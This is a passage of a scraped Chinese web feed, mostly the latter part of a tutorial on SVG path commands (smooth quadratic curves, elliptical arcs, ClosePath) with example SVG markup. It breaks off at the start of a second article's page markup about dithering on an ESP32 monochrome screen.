    <span class="hljs-tag">&lt;<span class="hljs-name">polyline</span> <span class="hljs-attr">points</span>=<span class="hljs-string">"10,50 25,25 40,50"</span> <span class="hljs-attr">stroke</span>=<span class="hljs-string">"rgba(0,0,0,.2)"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"none"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">circle</span> <span class="hljs-attr">cx</span>=<span class="hljs-string">"25"</span> <span class="hljs-attr">cy</span>=<span class="hljs-string">"25"</span> <span class="hljs-attr">r</span>=<span class="hljs-string">"1.5"</span> /&gt;</span>

    <span class="hljs-comment">&lt;!-- 曲线顶点 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">circle</span> <span class="hljs-attr">cx</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">cy</span>=<span class="hljs-string">"50"</span> <span class="hljs-attr">r</span>=<span class="hljs-string">"1.5"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">circle</span> <span class="hljs-attr">cx</span>=<span class="hljs-string">"40"</span> <span class="hljs-attr">cy</span>=<span class="hljs-string">"50"</span> <span class="hljs-attr">r</span>=<span class="hljs-string">"1.5"</span> /&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">g</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"SmoothQuadraticDown"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">polyline</span>
        <span class="hljs-attr">points</span>=<span class="hljs-string">"40,50 55,75 70,50"</span>
        <span class="hljs-attr">stroke</span>=<span class="hljs-string">"rgba(0,0,0,.2)"</span>
        <span class="hljs-attr">stroke-dasharray</span>=<span class="hljs-string">"2"</span>
        <span class="hljs-attr">fill</span>=<span class="hljs-string">"none"</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">circle</span> <span class="hljs-attr">cx</span>=<span class="hljs-string">"55"</span> <span class="hljs-attr">cy</span>=<span class="hljs-string">"75"</span> <span class="hljs-attr">r</span>=<span class="hljs-string">"1.5"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"lightgrey"</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">circle</span> <span class="hljs-attr">cx</span>=<span class="hljs-string">"70"</span> <span class="hljs-attr">cy</span>=<span class="hljs-string">"50"</span> <span class="hljs-attr">r</span>=<span class="hljs-string">"1.5"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">g</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">g</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"SmoothQuadraticUp"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">polyline</span>
        <span class="hljs-attr">points</span>=<span class="hljs-string">"70,50 85,25 100,50"</span>
        <span class="hljs-attr">stroke</span>=<span class="hljs-string">"rgba(0,0,0,.2)"</span>
        <span class="hljs-attr">stroke-dasharray</span>=<span class="hljs-string">"2"</span>
        <span class="hljs-attr">fill</span>=<span class="hljs-string">"none"</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">circle</span> <span class="hljs-attr">cx</span>=<span class="hljs-string">"85"</span> <span class="hljs-attr">cy</span>=<span class="hljs-string">"25"</span> <span class="hljs-attr">r</span>=<span class="hljs-string">"1.5"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"lightgrey"</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">circle</span> <span class="hljs-attr">cx</span>=<span class="hljs-string">"100"</span> <span class="hljs-attr">cy</span>=<span class="hljs-string">"50"</span> <span class="hljs-attr">r</span>=<span class="hljs-string">"1.5"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">g</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">use</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">"#SmoothQuadraticDown"</span> <span class="hljs-attr">x</span>=<span class="hljs-string">"60"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">use</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">"#SmoothQuadraticUp"</span> <span class="hljs-attr">x</span>=<span class="hljs-string">"60"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">use</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">"#SmoothQuadraticDown"</span> <span class="hljs-attr">x</span>=<span class="hljs-string">"120"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">g</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></code></pre>
<p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ea010fbb5eae47da9880aebe6b777277~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="858" loading="lazy"/></p>
<h3 id="user-content-椭圆曲线" data-id="heading-3"><a data-link-icon="https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8" data-link-title="椭圆曲线" href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FSVG%2FReference%2FAttribute%2Fd%23%25E6%25A4%25AD%25E5%259C%2586%25E6%259B%25B2%25E7%25BA%25BF" title="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/d#%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF" target="_blank" ref="nofollow noopener noreferrer">椭圆曲线</a></h3>
<p><em>椭圆曲线</em>是定义为椭圆的一部分的曲线。有时，使用椭圆曲线绘制高度规则的曲线会比使用贝塞尔曲线更容易。</p>
<table>
	<tbody>
		<tr>
			<th scope="col">命令</th>
			<th scope="col">参数</th>
			<th scope="col">备注</th>
		</tr>
		<tr>
			<th scope="row">A</th>
			<td>(<code>rx</code> <code>ry</code> <code>angle</code> <code>large-arc-flag</code> <code>sweep-flag</code> <code>x</code> <code>y</code>)+</td>
			<td>
			<p>在当前位置和坐标 <code>x</code>,<code>y</code> 之间绘制一条椭圆曲线。用于绘制圆弧的椭圆中心根据命令的其他参数确定：</p>
<pre><code class="hljs language-xml" lang="xml">		<span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
			<span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>rx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>和<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>ry<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>是椭圆的两个半径；<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
			<span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>angle<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>表示椭圆相对于 x 轴的旋转角度；<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
			<span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>large-arc-flag<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>和<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>sweep-flag<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>允许选择必须绘制的弧线，因为其他参数可以绘制 4 条可能的弧线。
			<span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
				<span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>large-arc-flag<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>允许选择一个大弧线（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>）或一个小弧线（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>），<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
				<span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>sweep-flag<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>允许选择一条顺时针旋转的弧线（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>）或一条逆时针旋转的弧线（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>）<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
			<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
			<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
		坐标<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>y<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>将成为下一个命令中的当前位置。后续参数集合的序列将被解释为隐式的绝对位置的椭圆曲线（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>A<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>）命令的参数。<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">"row"</span>&gt;</span>a<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>(<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>rx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>ry<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>angle<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>large-arc-flag<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>sweep-flag<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>)+<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>在当前位置和指定位置之间绘制一条椭圆曲线。指定位置为当前位置沿 x 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>以及沿 y 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>处。用于绘制圆弧的椭圆中心根据命令的其他参数确定：<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

		<span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
			<span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>rx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>和<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>ry<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>是椭圆的两个半径；<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
			<span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>angle<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>表示椭圆相对于 x 轴的旋转角度；<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
			<span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>large-arc-flag<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>和<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>sweep-flag<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>允许选择必须绘制的弧线，因为其他参数可以绘制 4 条可能的弧线。
			<span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
				<span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>large-arc-flag<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>允许选择一个大弧线（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>）或一个小弧线（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>），<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
				<span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>sweep-flag<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>允许选择一条顺时针旋转的弧线（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>）或一条逆时针旋转的弧线（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>）<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
			<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
			<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
		当前位置沿 x 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>以及沿 y 轴偏移后的位置将成为下一个命令中的当前位置。后续参数集合的序列将被解释为隐式的相对位置的椭圆曲线（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>a<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>）命令的参数。<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
</code></pre>
</td></tr></tbody></table>
<p>示例</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">"0 0 20 20"</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- 通过弧形标志绘制不同的弧形路径 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">path</span>
    <span class="hljs-attr">fill</span>=<span class="hljs-string">"none"</span>
    <span class="hljs-attr">stroke</span>=<span class="hljs-string">"red"</span>
    <span class="hljs-attr">d</span>=<span class="hljs-string">"M 6,10
           A 6 4 10 1 0 14,10"</span> /&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">path</span>
    <span class="hljs-attr">fill</span>=<span class="hljs-string">"none"</span>
    <span class="hljs-attr">stroke</span>=<span class="hljs-string">"lime"</span>
    <span class="hljs-attr">d</span>=<span class="hljs-string">"M 6,10
           A 6 4 10 1 1 14,10"</span> /&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">path</span>
    <span class="hljs-attr">fill</span>=<span class="hljs-string">"none"</span>
    <span class="hljs-attr">stroke</span>=<span class="hljs-string">"purple"</span>
    <span class="hljs-attr">d</span>=<span class="hljs-string">"M 6,10
           A 6 4 10 0 1 14,10"</span> /&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">path</span>
    <span class="hljs-attr">fill</span>=<span class="hljs-string">"none"</span>
    <span class="hljs-attr">stroke</span>=<span class="hljs-string">"pink"</span>
    <span class="hljs-attr">d</span>=<span class="hljs-string">"M 6,10
           A 6 4 10 0 0 14,10"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></code></pre>
<p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9d9fb5bd2d54424fb43d956153a7c48c~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="872" loading="lazy"/></p>
<h3 id="user-content-closepath" data-id="heading-4"><a data-link-icon="https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8" data-link-title="ClosePath" href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FSVG%2FReference%2FAttribute%2Fd%23closepath" title="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/d#closepath" target="_blank" ref="nofollow noopener noreferrer">ClosePath</a></h3>
<p><em>ClosePath</em> 命令将从<em>当前位置</em>绘制一条直线到路径中的第一个点。</p>
<table>
	<tbody>
		<tr>
			<th scope="col">命令</th>
			<th scope="col">参数</th>
			<th scope="col">备注</th>
		</tr>
		<tr>
			<th scope="row">Z, z</th>
			<td/>
			<td>通过连接路径的最后一个点与路径的起始点来闭合当前的子路径。如果这两个点的坐标不同，则在两者之间绘制一条直线。</td>
		</tr>
	</tbody>
</table>
<p><strong>备注：</strong>使用 <em>ClosePath</em> 命令闭合的形状的外观可能与使用其他命令向起始点绘制一条线而闭合的形状不同，因为前者是将线条的末端连接在一起（根据 <a data-link-icon="https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8" data-link-title="stroke-linejoin" href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FSVG%2FReference%2FAttribute%2Fstroke-linejoin" title="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/stroke-linejoin" target="_blank" ref="nofollow noopener noreferrer">stroke-linejoin</a> 的设置），而不是仅仅绘制到坐标点上。</p>
<p>示例</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">"0 -1 30 11"</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span>&gt;</span>
  <span class="hljs-comment">&lt;!--
  一个起点和终点不同的开放形状
  --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">path</span>
    <span class="hljs-attr">stroke</span>=<span class="hljs-string">"red"</span>
    <span class="hljs-attr">d</span>=<span class="hljs-string">"M 5,1
           l -4,8 8,0"</span> /&gt;</span>

  <span class="hljs-comment">&lt;!--
  一个起点和终点相同的开放形状
  --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">path</span>
    <span class="hljs-attr">stroke</span>=<span class="hljs-string">"red"</span>
    <span class="hljs-attr">d</span>=<span class="hljs-string">"M 15,1
           l -4,8 8,0 -4,-8"</span> /&gt;</span>

  <span class="hljs-comment">&lt;!--
  一个起点和终点不同的闭合形状
  --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">path</span>
    <span class="hljs-attr">stroke</span>=<span class="hljs-string">"red"</span>
    <span class="hljs-attr">d</span>=<span class="hljs-string">"M 25,1
           l -4,8 8,0
           z"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></code></pre>
<p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8a58c4cf549e4948a4fa3f6318162f3f~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="1106" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[屏幕不够，算法来凑(二)：ESP32 单色屏上的 Ditherpunk 实战]]></title>    <link>https://juejin.cn/post/7602894102992093194</link>    <guid>https://juejin.cn/post/7602894102992093194</guid>    <pubDate>2026-02-05T01:48:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602894102992093194" data-draft-id="7602893600251133998" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="屏幕不够，算法来凑(二)：ESP32 单色屏上的 Ditherpunk 实战"/> <meta itemprop="keywords" content="算法"/> <meta itemprop="datePublished" content="2026-02-05T01:48:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="chaosgoo"/> <meta itemprop="url" content="https://juejin.cn/user/2541726616010317"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            屏幕不够，算法来凑(二)：ESP32 单色屏上的 Ditherpunk 实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2541726616010317/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    chaosgoo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T01:48:26.000Z" title="Thu Feb 05 2026 01:48:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 